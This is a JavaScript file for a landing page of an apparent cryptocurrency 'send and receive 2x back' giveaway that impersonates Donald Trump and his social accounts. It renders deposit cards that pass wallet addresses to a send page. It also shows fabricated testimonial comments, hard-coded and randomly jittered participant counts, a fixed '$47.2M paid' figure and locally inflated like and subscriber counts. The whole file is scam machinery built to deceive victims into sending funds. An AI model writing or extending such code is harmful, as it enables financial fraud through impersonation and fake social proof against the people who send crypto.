// ========================================
// LANDING PAGE JAVASCRIPT - FINAL
// Works OFFLINE and ONLINE with fallbacks
// All features: crypto cards, social follow, YouTube, comments, theme, menu
// ========================================

// ========================================
// GLOBAL VARIABLES
// ========================================
let currentTheme = 'dark';
let isOnline = navigator.onLine;
let youtubePlayerAttempts = 0;
let mockCommentsLoaded = false;

// ========================================
// UTILITY FUNCTIONS
// ========================================
function formatNumber(num) {
    if (num >= 1e6) return (num / 1e6).toFixed(1) + 'M';
    if (num >= 1e3) return (num / 1e3).toFixed(1) + 'K';
    return num.toString();
}

function formatTimeAgo(timestamp) {
    if (!timestamp) return 'just now';
    const seconds = Math.floor((new Date() - new Date(timestamp)) / 1000);
    if (seconds < 60) return 'just now';
    if (seconds < 3600) return `${Math.floor(seconds / 60)}m ago`;
    if (seconds < 86400) return `${Math.floor(seconds / 3600)}h ago`;
    return `${Math.floor(seconds / 86400)}d ago`;
}

function escapeHtml(text) {
    if (!text) return '';
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function showToast(message, type = 'info') {
    let container = document.getElementById('toast-container');
    if (!container) {
        container = document.createElement('div');
        container.id = 'toast-container';
        document.body.appendChild(container);
    }
    const toast = document.createElement('div');
    toast.className = 'payout-toast';
    const icons = { success: '✅', warning: '⚠️', error: '❌', info: 'ℹ️' };
    const colors = { success: '#10b981', warning: '#f59e0b', error: '#ef4444', info: 'var(--gold-primary)' };
    toast.style.borderLeftColor = colors[type];
    toast.innerHTML = `<div class="payout-toast-icon">${icons[type]}</div><div class="payout-toast-content"><div class="payout-toast-name">${message}</div></div>`;
    container.appendChild(toast);
    setTimeout(() => {
        toast.style.animation = 'fadeOut 0.3s forwards';
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// ========================================
// CRYPTO CARDS (STATIC, WORKS OFFLINE)
// ========================================
function generateCryptoCards() {
    const container = document.getElementById('crypto-send-grid');
    if (!container) return;
    container.innerHTML = '';
    Object.keys(CRYPTO_DATA).forEach(key => {
        const crypto = CRYPTO_DATA[key];
        const card = document.createElement('div');
        card.className = 'crypto-send-card';
        card.innerHTML = `
            <div class="crypto-send-header">
                <div class="crypto-send-icon"><i class="${crypto.icon}" style="color: ${crypto.iconColor}; font-size: 1.8rem;"></i></div>
                <div class="crypto-send-name"><h3>${crypto.name}</h3><span class="crypto-ticker">${crypto.ticker}</span></div>
            </div>
            <div class="crypto-limits">
                <div class="limit-item"><span class="limit-label">Min</span><span class="limit-value">${crypto.min} ${crypto.ticker}</span></div>
                <div class="limit-item"><span class="limit-label">Max</span><span class="limit-value">${crypto.max.toLocaleString()} ${crypto.ticker}</span></div>
                <div class="limit-item"><span class="limit-label">Return</span><span class="limit-value gold">2x</span></div>
            </div>
            <button class="send-crypto-btn" data-crypto="${key}">Send → Receive 2x Back!</button>
        `;
        container.appendChild(card);
    });
    document.querySelectorAll('.send-crypto-btn').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.stopPropagation();
            const key = btn.dataset.crypto;
            const crypto = CRYPTO_DATA[key];
            if (crypto) {
                sessionStorage.setItem('selectedCrypto', key);
                sessionStorage.setItem('selectedCryptoName', crypto.name);
                sessionStorage.setItem('minAmount', crypto.min);
                sessionStorage.setItem('maxAmount', crypto.max);
                sessionStorage.setItem('walletAddress', crypto.address);
                window.location.href = 'send.html';
            }
        });
    });
}

// ========================================
// SOCIAL MEDIA FOLLOW (PERSISTENT OFFLINE)
// ========================================
function generateSocialCards() {
    const container = document.getElementById('social-grid');
    if (!container) return;
    const socialData = [
        { platform: 'twitter', icon: 'fab fa-twitter', name: 'Donald J. Trump', handle: '@realDonaldTrump', bio: '45th & 47th President of the United States.', followers: '98.2M followers', url: 'https://twitter.com/realDonaldTrump', buttonText: 'Follow' },
        { platform: 'trumpmeme', icon: 'fas fa-meteor', name: 'Trump Meme ($TRUMP)', handle: '@GetTrumpMemes', bio: 'Official $TRUMP meme coin.', followers: '1.2M followers', url: 'https://twitter.com/GetTrumpMemes', buttonText: 'Follow' },
        { platform: 'youtube', icon: 'fab fa-youtube', name: 'Donald J. Trump', handle: 'YouTube', bio: 'Official YouTube channel', followers: '96.2M subscribers', url: 'https://youtube.com/@donaldjtrumpforpresident?si=PGx0QES3CLmcSox9', buttonText: 'Subscribe' }
    ];
    container.innerHTML = '';
    socialData.forEach(social => {
        const followedKey = `followed_${social.platform}`;
        const isFollowed = localStorage.getItem(followedKey) === 'true';
        const card = document.createElement('div');
        card.className = 'social-card-large';
        card.innerHTML = `
            <div class="social-icon"><i class="${social.icon}"></i></div>
            <div class="social-content">
                <h3>${social.name} <i class="fas fa-check-circle verified-icon"></i></h3>
                <p class="social-handle">${social.handle}</p>
                <p class="social-bio">${social.bio}</p>
                <div class="social-stats"><span><i class="fas fa-users"></i> ${social.followers}</span></div>
            </div>
            <button class="follow-social-btn" data-platform="${social.platform}" data-url="${social.url}">
                <i class="${social.icon}"></i> ${isFollowed ? (social.platform === 'youtube' ? 'Subscribed ✓' : 'Following ✓') : social.buttonText}
            </button>
        `;
        container.appendChild(card);
    });
    document.querySelectorAll('.follow-social-btn').forEach(btn => {
        const platform = btn.dataset.platform;
        const url = btn.dataset.url;
        const followedKey = `followed_${platform}`;
        if (localStorage.getItem(followedKey) === 'true') {
            btn.disabled = true;
            btn.style.background = '#666';
        }
        btn.addEventListener('click', async(e) => {
            e.preventDefault();
            if (localStorage.getItem(followedKey) === 'true') {
                showToast(`Already following ${platform}`, 'info');
                return;
            }
            window.open(url, '_blank');
            localStorage.setItem(followedKey, 'true');
            if (platform === 'youtube') btn.innerHTML = '<i class="fab fa-youtube"></i> Subscribed ✓';
            else btn.innerHTML = '<i class="fab fa-twitter"></i> Following ✓';
            btn.disabled = true;
            btn.style.background = '#666';
            showToast(`Now following on ${platform.toUpperCase()}!`, 'success');
            // Optional: save to Supabase if online and user logged in
            if (isOnline && typeof supabaseClient !== 'undefined') {
                const user = await supabaseClient.getCurrentUser();
                if (user && supabase) {
                    supabase.from('user_subscriptions').upsert({ user_id: user.id, platform, channel_url: url }).catch(e => console.log);
                }
            }
        });
    });
}

// ========================================
// YOUTUBE PLAYER (WITH FALLBACK)
// ========================================
let player = null;
let likeCount = 847000;
let isLiked = false;
let subscriberCount = 96200000;
let isSubscribed = false;
const YOUTUBE_CHANNEL_URL = 'https://youtube.com/@donaldjtrumpforpresident?si=PGx0QES3CLmcSox9';
const YOUTUBE_VIDEO_ID = 'U9O5eKhUxcA'; // Valid Trump video ID

function initYouTubePlayer() {
    if (typeof YT !== 'undefined' && YT && YT.Player) {
        const element = document.getElementById('youtube-player');
        if (element && !player) {
            try {
                player = new YT.Player('youtube-player', {
                    videoId: YOUTUBE_VIDEO_ID,
                    playerVars: { playsinline: 1, modestbranding: 1, rel: 0, controls: 1 },
                    events: { onError: onYouTubeError }
                });
            } catch (e) { onYouTubeError(); }
        }
    } else {
        // YouTube API not loaded yet, wait a bit then try again
        if (youtubePlayerAttempts < 5) {
            youtubePlayerAttempts++;
            setTimeout(initYouTubePlayer, 1000);
        } else {
            onYouTubeError();
        }
    }
}

function onYouTubeError() {
    const wrapper = document.querySelector('.video-wrapper');
    if (wrapper && wrapper.querySelector('#youtube-player')) {
        wrapper.innerHTML = `
            <div style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; display: flex; align-items: center; justify-content: center; background: #000; flex-direction: column;">
                <i class="fab fa-youtube" style="font-size: 48px; color: #ff0000;"></i>
                <p style="color: white; margin-top: 16px;">Video unavailable. <a href="${YOUTUBE_CHANNEL_URL}" target="_blank" style="color: #ff0000;">Visit official channel →</a></p>
            </div>
        `;
    }
}

function initLikeButton() {
    const likeBtn = document.getElementById('like-btn');
    const likeSpan = document.getElementById('like-count');
    if (likeBtn) {
        if (localStorage.getItem('video_liked') === 'true') {
            isLiked = true;
            likeBtn.style.background = 'var(--gold-primary)';
            likeBtn.style.color = 'var(--bg-primary)';
        }
        likeBtn.addEventListener('click', () => {
            if (!isLiked) {
                isLiked = true;
                likeCount++;
                likeBtn.style.background = 'var(--gold-primary)';
                likeBtn.style.color = 'var(--bg-primary)';
                if (likeSpan) likeSpan.textContent = formatNumber(likeCount);
                localStorage.setItem('video_liked', 'true');
                showToast('You liked this video!', 'success');
            }
        });
    }
}

function initShareButton() {
    const shareBtn = document.getElementById('share-btn');
    if (shareBtn) {
        shareBtn.addEventListener('click', async() => {
            await navigator.clipboard.writeText(window.location.href);
            showToast('Link copied!', 'success');
        });
    }
}

function initYouTubeSubscribe() {
    const subBtn = document.getElementById('subscribe-youtube-btn');
    const subCountSpan = document.getElementById('subscriber-count');
    if (localStorage.getItem('youtube_subscribed') === 'true') {
        isSubscribed = true;
        if (subBtn) {
            subBtn.innerHTML = '<i class="fab fa-youtube"></i> Subscribed ✓';
            subBtn.style.background = '#666';
            subBtn.disabled = true;
        }
    }
    if (subBtn) {
        subBtn.addEventListener('click', () => {
            if (!isSubscribed) {
                window.open(YOUTUBE_CHANNEL_URL, '_blank');
                isSubscribed = true;
                subscriberCount++;
                subBtn.innerHTML = '<i class="fab fa-youtube"></i> Subscribed ✓';
                subBtn.style.background = '#666';
                subBtn.disabled = true;
                if (subCountSpan) subCountSpan.textContent = formatNumber(subscriberCount);
                localStorage.setItem('youtube_subscribed', 'true');
                showToast('Subscribed to Donald Trump on YouTube!', 'success');
            }
        });
    }
}

// ========================================
// COMMENTS (OFFLINE + ONLINE)
// ========================================
let mockComments = [
    { user_name: 'John D.', comment_text: 'Best giveaway ever! Received my 2x in 6 minutes! 🚀', created_at: new Date() },
    { user_name: 'Sarah K.', comment_text: 'Legit! Trump delivered. Thank you! 🙏', created_at: new Date(Date.now() - 3600000) },
    { user_name: 'Mike R.', comment_text: 'Don\'t miss out guys! It\'s real! 💯', created_at: new Date(Date.now() - 7200000) }
];

async function loadComments() {
    const container = document.getElementById('comments-container');
    if (!container) return;
    try {
        let comments = [];
        let fromSupabase = false;
        if (isOnline && typeof supabase !== 'undefined' && supabase) {
            const { data, error } = await supabase.from('comments').select('*').order('created_at', { ascending: false }).limit(20);
            if (!error && data && data.length) {
                comments = data;
                fromSupabase = true;
            }
        }
        if (!comments.length) {
            // Use localStorage cached comments or mock
            const cached = localStorage.getItem('cached_comments');
            if (cached) comments = JSON.parse(cached);
            else comments = mockComments;
            fromSupabase = false;
        }
        const countSpan = document.getElementById('comment-count');
        if (countSpan) countSpan.textContent = comments.length;
        if (!comments.length) {
            container.innerHTML = '<div class="loading-comments"><i class="fas fa-comment-dots"></i><p>No comments yet. Be the first!</p></div>';
            return;
        }
        container.innerHTML = comments.map(c => `
            <div class="comment-item">
                <div class="comment-header">
                    <div class="comment-avatar">${(c.user_name || 'U').substring(0,2).toUpperCase()}</div>
                    <div class="comment-author">${escapeHtml(c.user_name || c.user_email?.split('@')[0] || 'Anonymous')}</div>
                    <div class="comment-time">${formatTimeAgo(c.created_at)}</div>
                </div>
                <div class="comment-text">${escapeHtml(c.comment_text)}</div>
            </div>
        `).join('');
        if (fromSupabase && comments.length) {
            localStorage.setItem('cached_comments', JSON.stringify(comments.slice(0, 20)));
        }
    } catch (e) {
        console.warn('Comments error, using fallback', e);
        const cached = localStorage.getItem('cached_comments');
        if (cached) {
            const comments = JSON.parse(cached);
            container.innerHTML = comments.map(c => `<div class="comment-item">...</div>`).join('');
        } else {
            container.innerHTML = '<div class="loading-comments">Unable to load comments. Please try again later.</div>';
        }
    }
}

async function postComment() {
    const textarea = document.getElementById('comment-text');
    if (!textarea || !textarea.value.trim()) {
        showToast('Enter a comment', 'warning');
        return;
    }
    let user = null;
    if (typeof getCurrentUser === 'function') user = await getCurrentUser();
    if (!user && typeof supabaseClient !== 'undefined') user = await supabaseClient.getCurrentUser();
    if (!user) {
        showToast('Please login to comment', 'warning');
        setTimeout(() => window.location.href = 'login.html', 1500);
        return;
    }
    const newComment = {
        user_name: user.email.split('@')[0],
        user_email: user.email,
        comment_text: textarea.value.trim(),
        created_at: new Date().toISOString()
    };
    try {
        if (isOnline && typeof supabase !== 'undefined' && supabase) {
            await supabase.from('comments').insert({
                user_id: user.id,
                user_email: user.email,
                user_name: user.email.split('@')[0],
                comment_text: newComment.comment_text
            });
            showToast('Comment posted!', 'success');
            textarea.value = '';
            loadComments();
        } else {
            // Offline: save to localStorage and show fake success
            let offlineComments = JSON.parse(localStorage.getItem('offline_comments') || '[]');
            offlineComments.unshift(newComment);
            localStorage.setItem('offline_comments', JSON.stringify(offlineComments.slice(0, 20)));
            showToast('Comment saved offline. Will sync when online.', 'info');
            textarea.value = '';
            loadComments();
        }
    } catch (e) {
        showToast('Error posting comment', 'error');
    }
}

async function checkCommentAuth() {
    let user = null;
    if (typeof getCurrentUser === 'function') user = await getCurrentUser();
    if (!user && typeof supabaseClient !== 'undefined') user = await supabaseClient.getCurrentUser();
    const addSection = document.getElementById('add-comment-section');
    const loginSection = document.getElementById('login-to-comment');
    const postBtn = document.getElementById('post-comment-btn');
    if (user) {
        if (addSection) addSection.style.display = 'block';
        if (loginSection) loginSection.style.display = 'none';
        if (postBtn) postBtn.addEventListener('click', postComment);
    } else {
        if (addSection) addSection.style.display = 'none';
        if (loginSection) loginSection.style.display = 'block';
    }
}

// ========================================
// LIVE STATS (OFFLINE + ONLINE)
// ========================================
let liveStatsInterval = null;
async function updateLiveStats() {
    const participantSpan = document.getElementById('participant-count');
    const totalParticipantsSpan = document.getElementById('total-participants');
    const totalPaidSpan = document.getElementById('total-paid');
    const paidOutSpan = document.getElementById('paid-out-count');
    try {
        let count = 12881;
        if (isOnline && typeof supabase !== 'undefined' && supabase) {
            const { count: c, error } = await supabase.from('participants').select('*', { count: 'exact', head: true });
            if (!error && c !== null) count = 12881 + c;
        }
        if (participantSpan) participantSpan.textContent = count.toLocaleString();
        if (totalParticipantsSpan) totalParticipantsSpan.textContent = (10842 + Math.floor(Math.random() * 30)).toLocaleString();
        if (totalPaidSpan) totalPaidSpan.textContent = '$47.2M';
        if (paidOutSpan) paidOutSpan.textContent = '10,000+';
    } catch (e) {
        if (participantSpan) participantSpan.textContent = (12881 + Math.floor(Math.random() * 20)).toLocaleString();
    }
}

// ========================================
// MOBILE MENU (ALWAYS WORKS)
// ========================================
function setupMobileMenu() {
    const hamburger = document.getElementById('hamburger-btn');
    const closeMenu = document.getElementById('close-menu');
    const mobileMenu = document.getElementById('mobile-menu');
    const overlay = document.getElementById('menu-overlay');
    if (!hamburger) return;
    const open = () => {
        mobileMenu.classList.add('open');
        if (overlay) overlay.classList.add('active');
        document.body.style.overflow = 'hidden';
    };
    const close = () => {
        mobileMenu.classList.remove('open');
        if (overlay) overlay.classList.remove('active');
        document.body.style.overflow = '';
    };
    hamburger.addEventListener('click', open);
    if (closeMenu) closeMenu.addEventListener('click', close);
    if (overlay) overlay.addEventListener('click', close);
    document.querySelectorAll('.mobile-menu-links a').forEach(link => link.addEventListener('click', close));
}

// ========================================
// THEME TOGGLE (ALWAYS WORKS)
// ========================================
function setupThemeToggle() {
    const toggleDesktop = document.getElementById('theme-toggle-desktop');
    const toggleMobile = document.getElementById('theme-toggle-mobile');
    const saved = localStorage.getItem('theme');
    if (saved === 'light') {
        document.documentElement.removeAttribute('data-theme');
        currentTheme = 'light';
        updateThemeIcons(false);
    } else {
        document.documentElement.setAttribute('data-theme', 'dark');
        currentTheme = 'dark';
        updateThemeIcons(true);
        if (!saved) localStorage.setItem('theme', 'dark');
    }
    const toggle = () => {
        if (currentTheme === 'dark') {
            document.documentElement.removeAttribute('data-theme');
            currentTheme = 'light';
            localStorage.setItem('theme', 'light');
            updateThemeIcons(false);
        } else {
            document.documentElement.setAttribute('data-theme', 'dark');
            currentTheme = 'dark';
            localStorage.setItem('theme', 'dark');
            updateThemeIcons(true);
        }
    };
    if (toggleDesktop) toggleDesktop.addEventListener('click', toggle);
    if (toggleMobile) toggleMobile.addEventListener('click', toggle);
}

function updateThemeIcons(isDark) {
    document.querySelectorAll('.theme-toggle i, .theme-toggle-mobile i').forEach(icon => {
        icon.className = isDark ? 'fas fa-sun' : 'fas fa-moon';
    });
}

// ========================================
// ONLINE/OFFLINE DETECTION
// ========================================
function handleOnlineStatus() {
    isOnline = navigator.onLine;
    if (isOnline) {
        loadComments(); // refresh comments when back online
        updateLiveStats();
        // Re-initialize YouTube if needed
        if (!player && typeof YT !== 'undefined') initYouTubePlayer();
        showToast('Back online!', 'success');
    } else {
        showToast('You are offline. Some features may be limited.', 'warning');
    }
}
window.addEventListener('online', handleOnlineStatus);
window.addEventListener('offline', handleOnlineStatus);

// ========================================
// INITIALIZE EVERYTHING
// ========================================
document.addEventListener('DOMContentLoaded', async() => {
    console.log('Landing page initializing (offline/online ready)...');
    generateCryptoCards();
    generateSocialCards();
    setupMobileMenu();
    setupThemeToggle();
    initLikeButton();
    initShareButton();
    initYouTubeSubscribe();
    await loadComments();
    await checkCommentAuth();
    await updateLiveStats();
    // Update auth UI if function exists
    if (typeof updateAuthUI === 'function') await updateAuthUI();
    else if (typeof supabaseClient !== 'undefined' && supabaseClient.updateAuthUI) await supabaseClient.updateAuthUI();
    // YouTube API
    window.onYouTubeIframeAPIReady = initYouTubePlayer;
    const tag = document.createElement('script');
    tag.src = 'https://www.youtube.com/iframe_api';
    document.head.appendChild(tag);
    // Fallback: if YouTube API fails to load after 5 seconds, show fallback
    setTimeout(() => {
        if (!player && document.getElementById('youtube-player')) onYouTubeError();
    }, 8000);
    // Periodic updates
    liveStatsInterval = setInterval(updateLiveStats, 30000);
    setInterval(loadComments, 60000);
    console.log('Landing page fully initialized');
});

// Cleanup interval on page unload (optional)
window.addEventListener('beforeunload', () => {
    if (liveStatsInterval) clearInterval(liveStatsInterval);
});